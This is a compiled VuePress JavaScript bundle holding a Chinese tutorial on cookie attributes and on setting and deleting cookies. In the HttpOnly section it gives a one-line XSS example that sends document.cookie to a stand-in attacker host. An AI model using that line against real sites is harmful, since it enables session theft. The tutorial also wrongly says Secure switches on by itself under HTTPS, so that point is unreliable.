(window.webpackJsonp=window.webpackJsonp||[]).push([[34],{295:function(e,o,a){e.exports=a.p+"assets/img/Snipaste_2024-08-04_18-52-48.2316b944.png"},369:function(e,o,a){"use strict";a.r(o);var t=a(14),v=Object(t.a)({},(function(){var e=this,o=e._self._c;return o("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[o("h1",{attrs:{id:"cookie-简介"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie-简介"}},[e._v("#")]),e._v(" Cookie 简介")]),e._v(" "),o("h2",{attrs:{id:"cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie"}},[e._v("#")]),e._v(" Cookie")]),e._v(" "),o("p",[e._v("Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会"),o("strong",[e._v("自动")]),e._v("附上这段信息。")]),e._v(" "),o("p",[e._v("Cookie 主要用于解决 HTTP 无状态性导致的一些问题。由于 HTTP 的无状态性，服务器无法确定两次请求是否来源于同一个客户端。此时就需要服务器向客户端派发一个 “身份证”，客户端每次发送请求时携带上这个身份证，以便于服务器识别客户端的身份。")]),e._v(" "),o("p",[e._v("在 HTML5 之前，还没有 Web Storage ，所以这种方式只能采用 Cookie 来进行。现代浏览器都支持了 Web Storage，使用 Web Storage 来做也是可以的。")]),e._v(" "),o("p",[e._v("Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。")]),e._v(" "),o("h2",{attrs:{id:"cookie-的属性"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie-的属性"}},[e._v("#")]),e._v(" Cookie 的属性")]),e._v(" "),o("h3",{attrs:{id:"name-value"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#name-value"}},[e._v("#")]),e._v(" Name / Value")]),e._v(" "),o("p",[e._v("Cookie 是以"),o("strong",[e._v("键值对")]),e._v("方式存储的，其中的 name 为键，也就是 Cookie 的名称，value 为值。")]),e._v(" "),o("h3",{attrs:{id:"domain"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#domain"}},[e._v("#")]),e._v(" Domain")]),e._v(" "),o("p",[e._v("Cookie 默认是以 “"),o("strong",[e._v("源")]),e._v("” 划分的，不同源的页面不能共享 Cookie。")]),e._v(" "),o("p",[e._v("有时，我们希望在子域名的网站中，统一可以保持主域名网站相同的登录状态。比如，在百度主网站（"),o("code",[e._v("baidu.com")]),e._v("）登录了之后，百度文库（"),o("code",[e._v("wenku.baidu.com")]),e._v("）、百度网盘（"),o("code",[e._v("pan.baidu.com")]),e._v("）等子域名下的网站就不用用户再次登录了。")]),e._v(" "),o("p",[e._v("所以，我们很多情况下，我们希望在子域名中同样可以访问到 Cookie，此时就需要使用 "),o("strong",[o("code",[e._v("domain")])]),e._v(" 属性了。")]),e._v(" "),o("p",[o("code",[e._v("Domain")]),e._v(" 指定了哪些域名可以接受 Cookie，在默认情况下，和当前页面的域是相同的，且不包含当前域的子域名，只能在当前域本身使用。")]),e._v(" "),o("p",[e._v("值得特别注意的是，"),o("strong",[e._v("如果我们指定了 "),o("code",[e._v("Domain")]),e._v(" 的值，那么是包含子域名的")]),e._v("。举例来说，如果我们指定了 "),o("code",[e._v("domain=baidu.com")]),e._v("，那么所有"),o("code",[e._v("baidu.com")]),e._v(" 的子域名都可以访问和使用这个 Cookie。也就是说，设置了 "),o("code",[e._v("domain")]),e._v(" 属性，比不设置它的限制要少，如果不设置 "),o("code",[e._v("domain")]),e._v(" ，子域名中是无法访问这个 Cookie 的。")]),e._v(" "),o("p",[o("code",[e._v("domain")]),e._v(" 是有安全性保障的，其一般是通过服务器来设置的。"),o("strong",[e._v("如果服务器设置的 "),o("code",[e._v("domain")]),e._v(" 值与当前根域名不同，那么此操作是无效的")]),e._v("。浏览器不允许将 "),o("code",[e._v("domain")]),e._v(" 设置为子域名以外的其他域名。否则 A 网站就可以给服务器颁发 B 网站的 Cookie，B 网站的安全性就会受到很大的威胁。")]),e._v(" "),o("h3",{attrs:{id:"path"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#path"}},[e._v("#")]),e._v(" Path")]),e._v(" "),o("p",[e._v("path 用于指定 Cookie 生效的路径。")]),e._v(" "),o("p",[e._v("由于 Cookie 在请求时被自动携带的原因，我们有时并不希望浏览器发送一些无用的 Cookie。比如购物车相关的 Cookie，可能只在购物车界面会被用到。如果我们没有设置 path，那么在商品详情、个人信息等相关页面发送请求时，都会携带上购物车相关的 Cookie。但是此时服务器并不希望获得这些 Cookie，那么就造成了网络资源的浪费。此时我们就可以通过添加 "),o("code",[e._v("path")]),e._v("，来配置 Cookie 生效的路径。")]),e._v(" "),o("p",[e._v("当设置了 path 之后，只有 path 与请求的路径匹配时，才会被携带上。需要注意的是，"),o("strong",[e._v("子路径也同样会被匹配")]),e._v("。")]),e._v(" "),o("p",[e._v("举个例子，如果设置了 "),o("code",[e._v("path=/base")]),e._v("，那么")]),e._v(" "),o("ul",[o("li",[o("code",[e._v("/")]),e._v(" 不会被匹配")]),e._v(" "),o("li",[o("code",[e._v("/home")]),e._v(" 不会被匹配")]),e._v(" "),o("li",[o("code",[e._v("/base")]),e._v(" 会被匹配")]),e._v(" "),o("li",[o("code",[e._v("/base/time")]),e._v(" 会被匹配")])]),e._v(" "),o("h3",{attrs:{id:"expires"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#expires"}},[e._v("#")]),e._v(" Expires")]),e._v(" "),o("p",[o("code",[e._v("expire")]),e._v(" 用于指定 Cookie 的"),o("strong",[e._v("过期时间")]),e._v("，其值为一个具体的时间点。在到达指定时间之后，这个 Cookie 就不会再被保留，也不会再被任何网络请求携带。")]),e._v(" "),o("h3",{attrs:{id:"max-age"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#max-age"}},[e._v("#")]),e._v(" Max-age")]),e._v(" "),o("p",[o("code",[e._v("max-age")]),e._v(" 用于指定 Cookie "),o("strong",[e._v("有效期的持续时间")]),e._v("，其值为一个数字，单位为秒。比如设置 max-age 为 1000 ，那么此 Cookie 就在设置 Cookie 之后的 1000 秒内有效。")]),e._v(" "),o("p",[e._v("既然有了 expires，那么为什么还要设置 max-age 呢？其实这和强缓存中为什么有 "),o("code",[e._v("expires")]),e._v(" 和 "),o("code",[e._v("max-age")]),e._v(" 的原因是相同的。一是客户端的时间可以被修改，二是服务端和客户端可能不在同一个时区。二者都会导致 expires 设置的有效期不准确，而 max-age 作为一个相对的时间段，则较为准确。")]),e._v(" "),o("p",[e._v("因此，如果同时设置了 expire 和 max-age，那么 "),o("strong",[e._v("max-age 会优先生效")]),e._v("。")]),e._v(" "),o("p",[e._v("如果一个 Cookie 没有指定 expire 和 max-age，那么这个 Cookie 的生命周期等同于会话，也称之为 Session Cookie。此 Cookie 将会在本次会话结束后失效。Session ID 就可保存在这种类型的 Cookie 中。")]),e._v(" "),o("h3",{attrs:{id:"secure"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#secure"}},[e._v("#")]),e._v(" Secure")]),e._v(" "),o("p",[o("code",[e._v("Secure")]),e._v(" 属性指定"),o("strong",[e._v("只有在加密协议 HTTPS 下，才能将这个 Cookie 发送给服务器")]),e._v("。它永远不会使用不安全的 HTTP 发送（本地主机除外）。该属性只是一个开关，不需要指定值。")]),e._v(" "),o("p",[e._v("如果使用了 HTTP 协议进行通信，那么服务端设置 Secure 属性是无效的。如果通信是 HTTPS 协议，该属性自动打开。")]),e._v(" "),o("h3",{attrs:{id:"httponly"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#httponly"}},[e._v("#")]),e._v(" HttpOnly")]),e._v(" "),o("p",[o("code",[e._v("HttpOnly")]),e._v(" 属性可以"),o("strong",[e._v("禁止前端使用 JavaScript 访问此 Cookie")]),e._v("，设置了 httpOnly 属性的 Cookie 只能通过 http 请求来操作。")]),e._v(" "),o("p",[e._v("设置 httpOnly 可以有效的防止**跨站脚本（XSS）**攻击：")]),e._v(" "),o("div",{staticClass:"language-js extra-class"},[o("pre",{pre:!0,attrs:{class:"language-js"}},[o("code",[o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),o("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("new")]),e._v(" "),o("span",{pre:!0,attrs:{class:"token class-name"}},[e._v("Image")]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("src "),o("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),o("span",{pre:!0,attrs:{class:"token string"}},[e._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),e._v(" "),o("span",{pre:!0,attrs:{class:"token operator"}},[e._v("+")]),e._v(" document"),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie"),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n")])])]),o("p",[e._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),o("code",[e._v("HttpOnly")]),e._v("属性，上面代码就不会读到该 Cookie。")]),e._v(" "),o("h3",{attrs:{id:"samesite"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#samesite"}},[e._v("#")]),e._v(" SameSite")]),e._v(" "),o("p",[o("code",[e._v("SameSite")]),e._v(" 属性允许服务器指定是否/何时通过"),o("strong",[e._v("跨站点请求")]),e._v("发送 Cookie。主要是为了防范**跨站请求伪造（CSRF）**攻击。")]),e._v(" "),o("p",[e._v("SameSite 有三种取值：")]),e._v(" "),o("ol",[o("li",[o("code",[e._v("Strict")]),e._v("：最严格的模式，完全禁止任何跨站请求的 Cookie 携带。在跨站请求时，任何情况下都不会发送此 Cookie。缺点是规则"),o("strong",[e._v("过于严格")]),e._v("。比如当前页面有一个 Github 链接，点击 Github 链接跳转过去应该要携带上 Github 的相关 Cookie，以实现登录状态。但是如果 Github 身份认证相关的 Cookie 设置了 "),o("code",[e._v("Samesite:strict")]),e._v("，那么这次跳转就不会携带上身份认证相关的 Cookie，跳转过去总是未登录状态。")]),e._v(" "),o("li",[o("code",[e._v("Lax")]),e._v("：稍微宽松一点的模式，允许在"),o("strong",[e._v("导航到目标网站的 GET 方法中")]),e._v("携带目标网站的 Cookie。允许三种情况：\n"),o("ul",[o("li",[o("strong",[e._v("链接")]),e._v("：用户点击一个指向目标网址的"),o("strong",[e._v("超链接")]),e._v("（如 "),o("code",[e._v('<a href="..."></a>')]),e._v("）。")]),e._v(" "),o("li",[o("strong",[e._v("预加载请求")]),e._v("：浏览器"),o("strong",[e._v("预先加载")]),e._v("目标网址的内容（如 "),o("code",[e._v('<link rel="prerender" href="..."/>')]),e._v("）。")]),e._v(" "),o("li",[o("strong",[e._v("GET 表单")]),e._v("：用户提交一个使用 "),o("strong",[e._v("GET 方法的表单")]),e._v("（如 ``）")])])]),e._v(" "),o("li",[o("code",[e._v("None")]),e._v("：允许任何跨站请求携带此 Cookie。但是此时必须开启 "),o("code",[e._v("Secure")]),e._v(" 属性，需要以 HTTPS 协议传输 Cookie。")])]),e._v(" "),o("h2",{attrs:{id:"设置-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#设置-cookie"}},[e._v("#")]),e._v(" 设置 Cookie")]),e._v(" "),o("h3",{attrs:{id:"服务端设置-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#服务端设置-cookie"}},[e._v("#")]),e._v(" 服务端设置 Cookie")]),e._v(" "),o("p",[e._v("一般来说，Cookie 都是服务端通过 HTTP/HTTPS 来设置的。")]),e._v(" "),o("p",[e._v("服务端可以通过响应头中的 "),o("code",[e._v("set-cookie")]),e._v(" 字段来设置 Cookie，我们随便打开一个网站：")]),e._v(" "),o("img",{staticStyle:{zoom:"50%"},attrs:{src:a(295)}}),e._v(" "),o("p",[e._v("可以看到，响应头中有多个 "),o("code",[e._v("set-cookie")]),e._v(" 字段，每设置一个 Cookie，就需要在响应头中添加一个 "),o("code",[e._v("set-cookie")]),e._v("。")]),e._v(" "),o("h3",{attrs:{id:"客户端设置-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#客户端设置-cookie"}},[e._v("#")]),e._v(" 客户端设置 Cookie")]),e._v(" "),o("p",[e._v("Cookie 存放在客户端，所以浏览器向 JS 开放了操作 Cookie 的接口，最常用的是通过 "),o("code",[e._v("document.cookie")]),e._v(" 来设置：")]),e._v(" "),o("div",{staticClass:"language-js extra-class"},[o("pre",{pre:!0,attrs:{class:"language-js"}},[o("code",[e._v("document"),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie "),o("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),o("span",{pre:!0,attrs:{class:"token string"}},[e._v('"键=值; path=?; domain=?; expire=?; max-age=?; secure"')]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n")])])]),o("p",[e._v("在客户端设置 Cookie 有一些区别：")]),e._v(" "),o("ul",[o("li",[o("p",[e._v("无法设置 httpOnly")])]),e._v(" "),o("li",[o("p",[e._v("在服务器端设置cookie时，如果没有写path，使用的是请求的path。而在客户端设置cookie时，也许根本没有请求发生。因此，path在客户端设置时的默认值是当前网页的path")])]),e._v(" "),o("li",[o("p",[e._v("客户端设置时，domain 的默认值是当前网页的domain")])])]),e._v(" "),o("h2",{attrs:{id:"删除-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#删除-cookie"}},[e._v("#")]),e._v(" 删除 Cookie")]),e._v(" "),o("p",[e._v("无论是浏览器还是服务端，都没有办法直接删除某一个 Cookie。我们删除 Cookie 的操作只能通过修改其过期时间来实现。")]),e._v(" "),o("p",[e._v("服务端：")]),e._v(" "),o("div",{staticClass:"language-yaml extra-class"},[o("pre",{pre:!0,attrs:{class:"language-yaml"}},[o("code",[o("span",{pre:!0,attrs:{class:"token key atrule"}},[e._v("set-cookie")]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(":")]),e._v(" token=; domain=yuanjin.tech; path=/; max"),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("-")]),e._v("age="),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("-")]),o("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),e._v("\n")])])]),o("p",[e._v("客户端：")]),e._v(" "),o("div",{staticClass:"language-js extra-class"},[o("pre",{pre:!0,attrs:{class:"language-js"}},[o("code",[e._v("document"),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie "),o("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),o("span",{pre:!0,attrs:{class:"token string"}},[e._v('" token=; domain=yuanjin.tech; path=/; max-age=-1"')]),o("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n")])])]),o("p",[e._v("在设置过期时间的时候，推荐使用 "),o("code",[e._v("max-age")]),e._v("，因为 "),o("code",[e._v("max-age")]),e._v(" 的生效优先级是高于 "),o("code",[e._v("expires")]),e._v(" 的。如果一个 Cookie 设置了 "),o("code",[e._v("max-age")]),e._v(" ，修改 "),o("code",[e._v("expires")]),e._v(" 为过期时间是无效的。")])])}),[],!1,null,null,null);o.default=v.exports}}]);